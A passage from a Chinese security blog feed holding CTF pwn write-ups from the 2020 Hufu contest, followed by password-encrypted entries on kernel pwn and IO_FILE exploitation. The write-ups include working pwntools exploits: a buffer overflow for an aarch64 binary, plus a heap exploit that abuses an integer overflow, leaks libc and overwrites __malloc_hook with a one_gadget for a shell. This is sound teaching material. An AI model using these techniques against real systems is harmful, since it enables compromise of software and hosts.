class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p><code>arm aarch64</code>架构的题,搭建好qemu环境即可调试,题目很简单,不需要本地调试,直接利用IDA F5查看伪C代码即可写EXP<br>200次输入正确结果,利用python里面的eval函数即可自动计算结果,然后通过覆盖目标变量的值即可getshell</p><p>本地运行需要安装所需要的库 ,搜索aarch64的交叉编译的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo apt-cache search aarch64</span><br><span class="line">cpp-5-aarch64-linux-gnu - GNU C preprocessor</span><br><span class="line">cpp-aarch64-linux-gnu - GNU C preprocessor (cpp) <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">g++-5-aarch64-linux-gnu - GNU C++ 编译器</span><br><span class="line">g++-aarch64-linux-gnu - GNU C++ compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">gcc-5-aarch64-linux-gnu - GNU C 编译器</span><br><span class="line">gcc-5-aarch64-linux-gnu-base - GCC, the GNU Compiler Collection (base package)</span><br><span class="line">gcc-aarch64-linux-gnu - GNU C compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">binutils-aarch64-linux-gnu - GNU binary utilities, <span class="keyword">for</span> aarch64-linux-gnu target</span><br><span class="line">qemu-system-arm - QEMU full system emulation binaries (arm)</span><br></pre></td></tr></table></figure><p>安装所需要的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-5-aarch64-linux-gnu gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.210.182'</span>,<span class="string">'40285'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line">    <span class="comment">#os.system("gdb -q -ex 'target remote localhost:1234' ")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>) :</span><br><span class="line">p. recvuntil(<span class="string">"~Math: "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">" = "</span>)[:<span class="number">-3</span>]</span><br><span class="line">answer = eval(data)</span><br><span class="line">p. sendline(str(answer))</span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">0x64</span>+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p. sendline(payload)</span><br><span class="line">p. interactive()</span><br></pre></td></tr></table></figure><h2 id="SecureBox"><a href="#SecureBox" class="headerlink" title="SecureBox"></a>SecureBox</h2><p>申请空间的函数,在判断size是否大于0xFFF的时候变量强制转化成了int类型,则有整型溢出,又当申请一个很大的空间的时候,由于空间肯定不够,最终不会申请,对应的指针位置为0,则此刻有了一个超大的size,以及指针以0为初始位置,即可实现任意写,最后将接受到的key值逆序与需要写的内容异或,通过enc函数则可往目标地址写上所需写的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LD <span class="keyword">import</span>*</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,sign = <span class="number">0</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    p.recvuntil(<span class="string">'Key: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(idx,off,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'16'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Msg: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Box ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Msg: \n'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.30.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">leak(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = [<span class="number">0xCB79A</span>,<span class="number">0xCB79D</span>,<span class="number">0xCB7A0</span>,<span class="number">0xE926B</span>, <span class="number">0xE9277</span>]  <span class="comment">#Kali 2.30</span></span><br><span class="line">rce = libc_base + one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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